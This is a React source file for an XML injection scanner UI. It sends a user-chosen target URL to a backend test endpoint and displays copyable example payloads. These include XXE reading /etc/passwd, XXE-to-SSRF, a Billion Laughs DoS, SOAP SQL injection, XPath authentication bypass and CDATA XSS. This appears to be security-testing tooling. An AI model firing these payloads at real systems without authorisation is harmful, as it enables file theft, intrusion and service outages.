import React, { useState } from 'react';
import axios from 'axios';
import { useTerminal } from '@/hooks/use-terminal';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { Checkbox } from '@/components/ui/checkbox';
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { 
  Select, 
  SelectContent, 
  SelectItem, 
  SelectTrigger, 
  SelectValue 
} from "@/components/ui/select";
import { Textarea } from '@/components/ui/textarea';
import { Progress } from '@/components/ui/progress';
import { Badge } from '@/components/ui/badge';
import { 
  AlertCircle, 
  FileWarning, 
  Shield, 
  ShieldAlert, 
  ShieldCheck, 
  ShieldX,
  Terminal,
  RefreshCw,
  CheckCircle2,
  Code,
  Copy,
  FileJson,
  AlertTriangle
} from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { cn } from '@/lib/utils';
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "@/components/ui/accordion";

interface XmlInjectorProps {
  onScanComplete?: (result: any) => void;
}

export default function XmlInjector({ onScanComplete }: XmlInjectorProps) {
  const [url, setUrl] = useState<string>('');
  const [method, setMethod] = useState<string>('POST');
  const [paramName, setParamName] = useState<string>('');
  const [payloadType, setPayloadType] = useState<string>('xxe');
  const [customPayload, setCustomPayload] = useState<string>('');
  const [testAllParams, setTestAllParams] = useState<boolean>(true);
  const [requestContentType, setRequestContentType] = useState<string>('application/xml');
  const [timeout, setTimeout] = useState<string>('5000');
  const [soapEndpoint, setSoapEndpoint] = useState<boolean>(false);
  
  const [isScanning, setIsScanning] = useState<boolean>(false);
  const [scanProgress, setScanProgress] = useState<number>(0);
  const [scanResults, setScanResults] = useState<any>(null);
  const [error, setError] = useState<string | null>(null);
  
  const { addCommandLine, addInfoLine, addErrorLine, addSuccessLine } = useTerminal();
  const { toast } = useToast();
  
  /**
   * Validate if string is a valid URL
   */
  const isValidUrl = (urlString: string): boolean => {
    try {
      // Ensure URL has a protocol
      const normalizedUrl = urlString.startsWith('http') ? urlString : `https://${urlString}`;
      new URL(normalizedUrl);
      return true;
    } catch (err) {
      return false;
    }
  };
  
  /**
   * Copy payload to clipboard
   */
  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      toast({
        title: 'Copied to clipboard',
        description: 'XML payload has been copied to your clipboard',
        duration: 2000
      });
    });
  };
  
  /**
   * Start the XML injection test
   */
  const handleScan = async () => {
    // Normalize URL if needed
    const normalizedUrl = url.startsWith('http') ? url : `https://${url}`;
    
    if (!isValidUrl(normalizedUrl)) {
      setError('Invalid URL format. Example: https://example.com');
      addErrorLine('Error: Invalid URL format. Example: https://example.com');
      return;
    }
    
    setError(null);
    setIsScanning(true);
    setScanProgress(0);
    setScanResults(null);
    
    addCommandLine(`Starting XML injection test for ${normalizedUrl}...`);
    addInfoLine(`Target URL: ${normalizedUrl}`);
    addInfoLine(`Method: ${method}`);
    addInfoLine(`Payload type: ${payloadType}`);
    addInfoLine(`Content-Type: ${requestContentType}`);
    
    if (soapEndpoint) {
      addInfoLine(`Testing as SOAP endpoint`);
    }
    
    if (paramName) {
      addInfoLine(`Target parameter: ${paramName}`);
    }
    
    // Simulate progress for UX
    const progressInterval = setInterval(() => {
      setScanProgress(prev => {
        if (prev >= 90) {
          clearInterval(progressInterval);
          return prev;
        }
        return prev + Math.floor(Math.random() * 5) + 1;
      });
    }, 300);
    
    try {
      const response = await axios.post('/api/security/xml-injector', {
        url: normalizedUrl,
        method,
        paramName: paramName || undefined,
        payloadType,
        customPayload: customPayload || undefined,
        testAllParams,
        requestContentType,
        timeout,
        soapEndpoint
      });
      
      clearInterval(progressInterval);
      setScanProgress(100);
      
      if (response.data.success) {
        const result = response.data.data;
        setScanResults(result);
        
        // Terminal output based on results
        addSuccessLine('XML injection test completed');
        
        if (result.vulnerable) {
          addErrorLine(`WARNING: ${normalizedUrl} is VULNERABLE to XML injection!`);
          
          if (result.vulnerableParams.length > 0) {
            addErrorLine(`Vulnerable parameters: ${result.vulnerableParams.join(', ')}`);
          }
          
          if (result.successfulPayloads.length > 0) {
            addInfoLine(`Successful payloads: ${result.successfulPayloads.length}`);
            
            // Show a sample of successful payloads
            result.successfulPayloads.slice(0, 2).forEach((payload: any, index: number) => {
              const shortPayload = payload.payload.length > 50 
                ? payload.payload.substring(0, 50) + '...' 
                : payload.payload;
              addInfoLine(`${index + 1}. ${payload.param}=${shortPayload}`);
            });
          }
        } else {
          addSuccessLine(`No XML injection vulnerabilities detected in ${normalizedUrl}`);
        }
        
        // Add security rating info
        addInfoLine(`Security rating: ${result.summary.riskLevel} (${result.summary.score}/100)`);
        
        if (onScanComplete) {
          onScanComplete(result);
        }
        
        toast({
          title: 'XML injection test completed',
          description: `Result: ${result.summary.riskLevel}`,
          variant: result.vulnerable ? 'destructive' : 'default'
        });
      } else {
        setError(response.data.message || 'Failed to test for XML injection');
        addErrorLine(`Error: ${response.data.message}`);
      }
    } catch (err: any) {
      clearInterval(progressInterval);
      const errorMessage = err.response?.data?.message || err.message || 'An error occurred';
      setError(errorMessage);
      addErrorLine(`Error: ${errorMessage}`);
      
      toast({
        title: 'Test failed',
        description: errorMessage,
        variant: 'destructive'
      });
    } finally {
      setIsScanning(false);
    }
  };
  
  /**
   * Reset the form and results
   */
  const handleReset = () => {
    setUrl('');
    setMethod('POST');
    setParamName('');
    setPayloadType('xxe');
    setCustomPayload('');
    setTestAllParams(true);
    setRequestContentType('application/xml');
    setTimeout('5000');
    setSoapEndpoint(false);
    setScanResults(null);
    setError(null);
    setScanProgress(0);
    addCommandLine('Reset XML injector');
  };
  
  /**
   * Get example payload based on type
   */
  const getExamplePayload = (): string => {
    switch (payloadType) {
      case 'xxe':
        return `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>`;
      case 'dos':
        return `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>`;
      case 'soap':
        return `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><soapenv:Body><ns1:getRecords soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:ns1="urn:SoapInjection">'or+1=1--</ns1:getRecords></soapenv:Body></soapenv:Envelope>`;
      case 'xpath':
        return `' or '1'='1`;
      case 'data':
        return `<![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]>`;
      default:
        return '';
    }
  };
  
  /**
   * Apply example payload
   */
  const applyExamplePayload = () => {
    const payload = getExamplePayload();
    setCustomPayload(payload);
    toast({
      title: 'Example payload applied',
      description: 'You can now edit or use this payload',
    });
  };
  
  /**
   * Get color based on risk level
   */
  const getRiskColor = (riskLevel: string): string => {
    switch (riskLevel) {
      case 'Critical':
        return 'text-red-600 border-red-600';
      case 'High Risk':
        return 'text-red-500 border-red-500';
      case 'Medium Risk':
        return 'text-orange-500 border-orange-500';
      case 'Low Risk':
        return 'text-yellow-500 border-yellow-500';
      case 'Safe':
        return 'text-green-500 border-green-500';
      default:
        return 'text-muted-foreground border-muted-foreground';
    }
  };
  
  /**
   * Get icon based on risk level
   */
  const getRiskIcon = (riskLevel: string) => {
    switch (riskLevel) {
      case 'Critical':
        return <ShieldX className="h-5 w-5 text-red-600" />;
      case 'High Risk':
        return <ShieldAlert className="h-5 w-5 text-red-500" />;
      case 'Medium Risk':
        return <AlertCircle className="h-5 w-5 text-orange-500" />;
      case 'Low Risk':
        return <AlertTriangle className="h-5 w-5 text-yellow-500" />;
      case 'Safe':
        return <ShieldCheck className="h-5 w-5 text-green-500" />;
      default:
        return <Shield className="h-5 w-5 text-muted-foreground" />;
    }
  };
  
  /**
   * Get icon based on vulnerability type
   */
  const getVulnerabilityIcon = (type: string) => {
    switch (type) {
      case 'xxe':
        return <FileWarning className="h-4 w-4 text-red-500" />;
      case 'dos':
        return <AlertTriangle className="h-4 w-4 text-red-600" />;
      case 'soap':
        return <FileJson className="h-4 w-4 text-orange-500" />;
      case 'xpath':
        return <Code className="h-4 w-4 text-orange-500" />;
      case 'data':
        return <Terminal className="h-4 w-4 text-yellow-500" />;
      default:
        return <AlertCircle className="h-4 w-4 text-muted-foreground" />;
    }
  };
  
  /**
   * Get type display name
   */
  const getTypeDisplayName = (type: string): string => {
    switch (type) {
      case 'xxe':
        return 'XML External Entity (XXE)';
      case 'dos':
        return 'Denial of Service (DoS)';
      case 'soap':
        return 'SOAP Injection';
      case 'xpath':
        return 'XPath Injection';
      case 'data':
        return 'XML Data Manipulation';
      default:
        return type.charAt(0).toUpperCase() + type.slice(1);
    }
  };
  
  return (
    <div className="space-y-6">
      <Card className="p-4 border-primary/30 bg-card">
        <h2 className="text-xl font-tech text-primary mb-4">XML Injection Testing Tool</h2>
        
        <Tabs defaultValue="scan" className="w-full">
          <TabsList className="grid grid-cols-2 mb-4">
            <TabsTrigger value="scan" className="font-tech">Run Scan</TabsTrigger>
            <TabsTrigger value="payloads" className="font-tech">Example Payloads</TabsTrigger>
          </TabsList>
          
          <TabsContent value="scan" className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="url" className="text-sm font-tech">Target URL</Label>
              <Input
                id="url"
                placeholder="https://example.com/api/xml"
                value={url}
                onChange={(e) => setUrl(e.target.value)}
                className="font-mono bg-background border-secondary/50"
                disabled={isScanning}
              />
              <p className="text-xs font-mono text-muted-foreground mt-1">
                Enter the URL of a web service that processes XML
              </p>
            </div>
            
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="method" className="text-sm font-tech">HTTP Method</Label>
                <Select
                  value={method}
                  onValueChange={(value) => setMethod(value)}
                  disabled={isScanning}
                >
                  <SelectTrigger id="method" className="bg-background border-secondary/50">
                    <SelectValue placeholder="Select method" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="POST">POST</SelectItem>
                    <SelectItem value="GET">GET</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              
              <div className="space-y-2">
                <Label htmlFor="content-type" className="text-sm font-tech">Content-Type</Label>
                <Select
                  value={requestContentType}
                  onValueChange={(value) => setRequestContentType(value)}
                  disabled={isScanning}
                >
                  <SelectTrigger id="content-type" className="bg-background border-secondary/50">
                    <SelectValue placeholder="Select content type" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="application/xml">application/xml</SelectItem>
                    <SelectItem value="text/xml">text/xml</SelectItem>
                    <SelectItem value="application/soap+xml">application/soap+xml</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            </div>
            
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="param-name" className="text-sm font-tech">Parameter Name (Optional)</Label>
                <Input
                  id="param-name"
                  placeholder="xml, data, etc."
                  value={paramName}
                  onChange={(e) => setParamName(e.target.value)}
                  className="font-mono bg-background border-secondary/50"
                  disabled={isScanning}
                />
                <p className="text-xs font-mono text-muted-foreground mt-1">
                  Leave empty to test all parameters
                </p>
              </div>
              
              <div className="space-y-2">
                <Label htmlFor="payload-type" className="text-sm font-tech">Payload Type</Label>
                <Select
                  value={payloadType}
                  onValueChange={(value) => setPayloadType(value)}
                  disabled={isScanning}
                >
                  <SelectTrigger id="payload-type" className="bg-background border-secondary/50">
                    <SelectValue placeholder="Select payload type" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="xxe">XML External Entity (XXE)</SelectItem>
                    <SelectItem value="dos">Denial of Service (DoS)</SelectItem>
                    <SelectItem value="soap">SOAP Injection</SelectItem>
                    <SelectItem value="xpath">XPath Injection</SelectItem>
                    <SelectItem value="data">XML Data Manipulation</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            </div>
            
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div className="space-y-2">
                <div className="flex items-center space-x-2">
                  <Checkbox 
                    id="test-all-params" 
                    checked={testAllParams}
                    onCheckedChange={(checked) => setTestAllParams(!!checked)}
                    disabled={isScanning}
                  />
                  <Label 
                    htmlFor="test-all-params" 
                    className="text-sm font-tech cursor-pointer"
                  >
                    Test all parameters
                  </Label>
                </div>
              </div>
              
              <div className="space-y-2">
                <div className="flex items-center space-x-2">
                  <Checkbox 
                    id="soap-endpoint" 
                    checked={soapEndpoint}
                    onCheckedChange={(checked) => setSoapEndpoint(!!checked)}
                    disabled={isScanning}
                  />
                  <Label 
                    htmlFor="soap-endpoint" 
                    className="text-sm font-tech cursor-pointer"
                  >
                    SOAP Endpoint
                  </Label>
                </div>
              </div>
            </div>
            
            <div className="space-y-2">
              <Label htmlFor="custom-payload" className="text-sm font-tech flex justify-between">
                <span>Custom Payload (Optional)</span>
                <Button 
                  variant="ghost" 
                  size="sm" 
                  className="h-6 text-xs"
                  onClick={applyExamplePayload}
                  disabled={isScanning}
                >
                  Apply Example
                </Button>
              </Label>
              <Textarea
                id="custom-payload"
                placeholder="<?xml version='1.0'?>"
                value={customPayload}
                onChange={(e) => setCustomPayload(e.target.value)}
                className="font-mono bg-background border-secondary/50 min-h-24"
                disabled={isScanning}
              />
              <p className="text-xs font-mono text-muted-foreground mt-1">
                Enter your own XML payload or click "Apply Example" to use a template
              </p>
            </div>
            
            {error && (
              <div className="bg-destructive/10 p-3 rounded-md border border-destructive/50 text-destructive flex items-start gap-2 text-sm font-mono">
                <AlertCircle className="h-4 w-4 mt-0.5" />
                <span>{error}</span>
              </div>
            )}
            
            {isScanning && (
              <div className="space-y-2">
                <div className="flex justify-between text-xs font-mono">
                  <span>Testing for XML injection vulnerabilities...</span>
                  <span>{scanProgress}%</span>
                </div>
                <div className="h-1.5 w-full bg-secondary/20 rounded-full overflow-hidden">
                  <div
                    className="h-full bg-primary transition-all duration-300"
                    style={{ width: `${scanProgress}%` }}
                  />
                </div>
              </div>
            )}
            
            <div className="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-3">
              <Button
                onClick={handleScan}
                disabled={isScanning || !url}
                className="bg-primary text-primary-foreground hover:bg-primary/90 font-tech"
              >
                {isScanning ? 'Testing...' : 'Start Test'}
              </Button>
              
              <Button
                onClick={handleReset}
                variant="outline"
                disabled={isScanning}
                className="border-secondary/50 text-secondary font-tech"
              >
                <RefreshCw className="h-4 w-4 mr-2" />
                Reset
              </Button>
            </div>
          </TabsContent>
          
          <TabsContent value="payloads" className="space-y-4">
            <Tabs defaultValue="xxe" className="w-full">
              <TabsList className="mb-4 flex flex-wrap">
                <TabsTrigger value="xxe" className="font-tech text-xs">XXE</TabsTrigger>
                <TabsTrigger value="dos" className="font-tech text-xs">DoS</TabsTrigger>
                <TabsTrigger value="soap" className="font-tech text-xs">SOAP</TabsTrigger>
                <TabsTrigger value="xpath" className="font-tech text-xs">XPath</TabsTrigger>
                <TabsTrigger value="data" className="font-tech text-xs">Data</TabsTrigger>
              </TabsList>
              
              <TabsContent value="xxe" className="space-y-3">
                <div className="p-3 bg-yellow-500/10 rounded-md border border-yellow-500/20 mb-3">
                  <div className="flex items-start gap-2">
                    <AlertTriangle className="h-4 w-4 text-yellow-500 mt-0.5" />
                    <div>
                      <p className="text-xs font-tech text-yellow-500">XML External Entity (XXE) Injection</p>
                      <p className="text-xs font-mono mt-1">
                        XXE attacks target applications that parse XML input. These vulnerabilities occur when XML 
                        input containing a reference to an external entity is processed by a weakly configured XML parser.
                      </p>
                    </div>
                  </div>
                </div>
                
                <div className="space-y-3">
                  <div className="bg-background rounded-md border border-secondary/20 overflow-hidden">
                    <div className="flex justify-between items-center p-2 bg-secondary/5 border-b border-secondary/20">
                      <span className="text-xs font-tech">Basic XXE</span>
                      <Button 
                        size="sm" 
                        variant="ghost" 
                        className="h-7 w-7 p-0" 
                        onClick={() => copyToClipboard(`<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>`)}
                      >
                        <Copy className="h-3.5 w-3.5" />
                      </Button>
                    </div>
                    <pre className="text-xs p-3 font-mono overflow-x-auto">
{`<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ 
  <!ELEMENT foo ANY > 
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<foo>&xxe;</foo>`}
                    </pre>
                  </div>
                  
                  <div className="bg-background rounded-md border border-secondary/20 overflow-hidden">
                    <div className="flex justify-between items-center p-2 bg-secondary/5 border-b border-secondary/20">
                      <span className="text-xs font-tech">XXE to SSRF</span>
                      <Button 
                        size="sm" 
                        variant="ghost" 
                        className="h-7 w-7 p-0" 
                        onClick={() => copyToClipboard(`<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://internal-server:8080/"> ]><foo>&xxe;</foo>`)}
                      >
                        <Copy className="h-3.5 w-3.5" />
                      </Button>
                    </div>
                    <pre className="text-xs p-3 font-mono overflow-x-auto">
{`<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ 
  <!ELEMENT foo ANY > 
  <!ENTITY xxe SYSTEM "http://internal-server:8080/"> 
]>
<foo>&xxe;</foo>`}
                    </pre>
                  </div>
                </div>
              </TabsContent>
              
              <TabsContent value="dos" className="space-y-3">
                <div className="p-3 bg-red-500/10 rounded-md border border-red-500/20 mb-3">
                  <div className="flex items-start gap-2">
                    <AlertTriangle className="h-4 w-4 text-red-500 mt-0.5" />
                    <div>
                      <p className="text-xs font-tech text-red-500">XML Denial of Service (DoS) Attacks</p>
                      <p className="text-xs font-mono mt-1">
                        XML DoS attacks like the "Billion Laughs" attack create a resource exhaustion by
                        expanding entities recursively, potentially crashing the parser or server.
                      </p>
                    </div>
                  </div>
                </div>
                
                <div className="bg-background rounded-md border border-secondary/20 overflow-hidden">
                  <div className="flex justify-between items-center p-2 bg-secondary/5 border-b border-secondary/20">
                    <span className="text-xs font-tech">Billion Laughs Attack</span>
                    <Button 
                      size="sm" 
                      variant="ghost" 
                      className="h-7 w-7 p-0" 
                      onClick={() => copyToClipboard(`<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>`)}
                    >
                      <Copy className="h-3.5 w-3.5" />
                    </Button>
                  </div>
                  <pre className="text-xs p-3 font-mono overflow-x-auto">
{`<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>`}
                  </pre>
                </div>
              </TabsContent>
              
              <TabsContent value="soap" className="space-y-3">
                <div className="p-3 bg-orange-500/10 rounded-md border border-orange-500/20 mb-3">
                  <div className="flex items-start gap-2">
                    <AlertTriangle className="h-4 w-4 text-orange-500 mt-0.5" />
                    <div>
                      <p className="text-xs font-tech text-orange-500">SOAP Injection</p>
                      <p className="text-xs font-mono mt-1">
                        SOAP injection attacks target web services using the SOAP protocol. Attackers can
                        inject malicious content into SOAP messages to exploit web services.
                      </p>
                    </div>
                  </div>
                </div>
                
                <div className="bg-background rounded-md border border-secondary/20 overflow-hidden">
                  <div className="flex justify-between items-center p-2 bg-secondary/5 border-b border-secondary/20">
                    <span className="text-xs font-tech">SQL Injection via SOAP</span>
                    <Button 
                      size="sm" 
                      variant="ghost" 
                      className="h-7 w-7 p-0" 
                      onClick={() => copyToClipboard(`<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><ns1:getRecords xmlns:ns1="urn:example">'or+1=1--</ns1:getRecords></soapenv:Body></soapenv:Envelope>`)}
                    >
                      <Copy className="h-3.5 w-3.5" />
                    </Button>
                  </div>
                  <pre className="text-xs p-3 font-mono overflow-x-auto">
{`<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <ns1:getRecords xmlns:ns1="urn:example">
      'or+1=1--
    </ns1:getRecords>
  </soapenv:Body>
</soapenv:Envelope>`}
                  </pre>
                </div>
              </TabsContent>
              
              <TabsContent value="xpath" className="space-y-3">
                <div className="p-3 bg-orange-500/10 rounded-md border border-orange-500/20 mb-3">
                  <div className="flex items-start gap-2">
                    <AlertTriangle className="h-4 w-4 text-orange-500 mt-0.5" />
                    <div>
                      <p className="text-xs font-tech text-orange-500">XPath Injection</p>
                      <p className="text-xs font-mono mt-1">
                        XPath injection attacks target applications that use XPath to query XML data.
                        These attacks can bypass authentication and extract data.
                      </p>
                    </div>
                  </div>
                </div>
                
                <div className="space-y-3">
                  <div className="bg-background rounded-md border border-secondary/20 overflow-hidden">
                    <div className="flex justify-between items-center p-2 bg-secondary/5 border-b border-secondary/20">
                      <span className="text-xs font-tech">Basic XPath Injection</span>
                      <Button 
                        size="sm" 
                        variant="ghost" 
                        className="h-7 w-7 p-0" 
                        onClick={() => copyToClipboard(`' or '1'='1`)}
                      >
                        <Copy className="h-3.5 w-3.5" />
                      </Button>
                    </div>
                    <pre className="text-xs p-3 font-mono overflow-x-auto">
{`' or '1'='1`}
                    </pre>
                  </div>
                  
                  <div className="bg-background rounded-md border border-secondary/20 overflow-hidden">
                    <div className="flex justify-between items-center p-2 bg-secondary/5 border-b border-secondary/20">
                      <span className="text-xs font-tech">Advanced XPath Injection</span>
                      <Button 
                        size="sm" 
                        variant="ghost" 
                        className="h-7 w-7 p-0" 
                        onClick={() => copyToClipboard(`' or count(parent::*/*)=1 or 'a'='b`)}
                      >
                        <Copy className="h-3.5 w-3.5" />
                      </Button>
                    </div>
                    <pre className="text-xs p-3 font-mono overflow-x-auto">
{`' or count(parent::*/*)=1 or 'a'='b`}
                    </pre>
                  </div>
                </div>
              </TabsContent>
              
              <TabsContent value="data" className="space-y-3">
                <div className="p-3 bg-yellow-500/10 rounded-md border border-yellow-500/20 mb-3">
                  <div className="flex items-start gap-2">
                    <AlertTriangle className="h-4 w-4 text-yellow-500 mt-0.5" />
                    <div>
                      <p className="text-xs font-tech text-yellow-500">XML Data Manipulation</p>
                      <p className="text-xs font-mono mt-1">
                        These attacks involve injecting special characters and structures to manipulate
                        XML data processing, potentially causing XSS or data corruption.
                      </p>
                    </div>
                  </div>
                </div>
                
                <div className="bg-background rounded-md border border-secondary/20 overflow-hidden">
                  <div className="flex justify-between items-center p-2 bg-secondary/5 border-b border-secondary/20">
                    <span className="text-xs font-tech">CDATA XSS</span>
                    <Button 
                      size="sm" 
                      variant="ghost" 
                      className="h-7 w-7 p-0" 
                      onClick={() => copyToClipboard(`<![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]>`)}
                    >
                      <Copy className="h-3.5 w-3.5" />
                    </Button>
                  </div>
                  <pre className="text-xs p-3 font-mono overflow-x-auto">
{`<![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]>`}
                  </pre>
                </div>
              </TabsContent>
            </Tabs>
          </TabsContent>
        </Tabs>
      </Card>
      
      {scanResults && (
        <Card className="p-4 border-secondary/30 bg-card">
          <Tabs defaultValue="summary" className="w-full">
            <TabsList className="grid grid-cols-3 mb-4">
              <TabsTrigger value="summary" className="font-tech">Summary</TabsTrigger>
              <TabsTrigger value="payloads" className="font-tech">Successful Payloads</TabsTrigger>
              <TabsTrigger value="recommendations" className="font-tech">Recommendations</TabsTrigger>
            </TabsList>
            
            <TabsContent value="summary" className="space-y-4">
              <div className="flex justify-between items-start">
                <div>
                  <h3 className="text-lg font-tech text-secondary">XML Injection Test Results</h3>
                  <p className="text-sm font-mono">{scanResults.url}</p>
                </div>
                <div className={cn(
                  "px-3 py-1 rounded-full border flex items-center space-x-2",
                  getRiskColor(scanResults.summary.riskLevel)
                )}>
                  {getRiskIcon(scanResults.summary.riskLevel)}
                  <span className="font-tech text-sm">{scanResults.summary.riskLevel}</span>
                </div>
              </div>
              
              <div className="p-4 bg-background rounded-md border border-secondary/20">
                <h4 className="text-sm font-tech mb-2">Scan Overview</h4>
                <div className="space-y-2 text-sm font-mono">
                  <div className="flex items-center justify-between">
                    <span className="text-muted-foreground">Vulnerability Status:</span>
                    <span className={scanResults.vulnerable ? "text-red-500" : "text-green-500"}>
                      {scanResults.vulnerable ? "VULNERABLE" : "Not Vulnerable"}
                    </span>
                  </div>
                  
                  <div className="flex items-center justify-between">
                    <span className="text-muted-foreground">Security Score:</span>
                    <span className={
                      scanResults.summary.score > 80 ? "text-red-600" :
                      scanResults.summary.score > 60 ? "text-red-500" :
                      scanResults.summary.score > 40 ? "text-orange-500" :
                      scanResults.summary.score > 20 ? "text-yellow-500" :
                      "text-green-500"
                    }>
                      {scanResults.summary.score}/100
                    </span>
                  </div>
                  
                  <div className="flex items-center justify-between">
                    <span className="text-muted-foreground">Detected Type:</span>
                    <span>{getTypeDisplayName(payloadType)}</span>
                  </div>
                  
                  <div className="flex items-center justify-between">
                    <span className="text-muted-foreground">Parameters Tested:</span>
                    <span>{scanResults.testedParams.join(', ') || 'None'}</span>
                  </div>
                  
                  <div className="flex items-center justify-between">
                    <span className="text-muted-foreground">Total Requests:</span>
                    <span>{scanResults.totalRequests}</span>
                  </div>
                  
                  <div className="flex items-center justify-between">
                    <span className="text-muted-foreground">Scan Duration:</span>
                    <span>{(scanResults.scanTime / 1000).toFixed(2)} seconds</span>
                  </div>
                </div>
                
                {scanResults.vulnerable && (
                  <div className="mt-4 p-3 bg-red-500/10 rounded-md border border-red-500/30 flex items-start gap-2">
                    <AlertTriangle className="h-4 w-4 text-red-500 mt-0.5" />
                    <div>
                      <p className="text-sm font-tech text-red-500">XML Injection Vulnerability Detected!</p>
                      <p className="text-xs font-mono mt-1">{scanResults.summary.description}</p>
                    </div>
                  </div>
                )}
              </div>
              
              {scanResults.vulnerableParams.length > 0 && (
                <div className="p-4 bg-background rounded-md border border-secondary/20">
                  <h4 className="text-sm font-tech mb-2">Vulnerable Parameters</h4>
                  <div className="flex flex-wrap gap-2">
                    {scanResults.vulnerableParams.map((param: string, i: number) => (
                      <Badge key={i} variant="outline" className="bg-red-500/10 text-red-500 border-red-500/30">
                        {param}
                      </Badge>
                    ))}
                  </div>
                </div>
              )}
            </TabsContent>
            
            <TabsContent value="payloads" className="space-y-4">
              {scanResults.successfulPayloads.length > 0 ? (
                <div className="space-y-4">
                  <h4 className="text-sm font-tech text-secondary">Successful Payloads</h4>
                  
                  <div className="space-y-3">
                    {scanResults.successfulPayloads.map((payload: any, i: number) => (
                      <div key={i} className="p-3 bg-background rounded-md border border-secondary/20">
                        <div className="flex items-center justify-between mb-2">
                          <div className="flex items-center gap-2">
                            {getVulnerabilityIcon(payloadType)}
                            <span className="font-tech text-sm">{payload.param}</span>
                          </div>
                          <Badge variant="outline" className="bg-red-500/10 text-red-500 border-red-500/30">
                            Status: {payload.response.status}
                          </Badge>
                        </div>
                        
                        <div className="text-xs font-mono p-2 bg-secondary/5 rounded mb-2 overflow-x-auto flex items-center justify-between group">
                          <code className="break-all whitespace-pre-wrap">
                            {payload.payload.length > 200 
                              ? payload.payload.substring(0, 200) + '...' 
                              : payload.payload}
                          </code>
                          <Button
                            variant="ghost"
                            size="sm"
                            className="h-6 w-6 p-0 text-muted-foreground hover:text-accent opacity-0 group-hover:opacity-100 transition-opacity"
                            onClick={() => copyToClipboard(payload.payload)}
                          >
                            <Copy className="h-3.5 w-3.5" />
                          </Button>
                        </div>
                        
                        {payload.response.indicators && payload.response.indicators.length > 0 && (
                          <div className="mt-2">
                            <p className="text-xs font-tech text-muted-foreground">Detection Indicators:</p>
                            <div className="flex flex-wrap gap-1 mt-1">
                              {payload.response.indicators.map((indicator: string, j: number) => (
                                <Badge key={j} variant="outline" className="text-xs bg-red-500/5 text-red-500 border-red-500/20">
                                  {indicator}
                                </Badge>
                              ))}
                            </div>
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="flex flex-col items-center justify-center py-8">
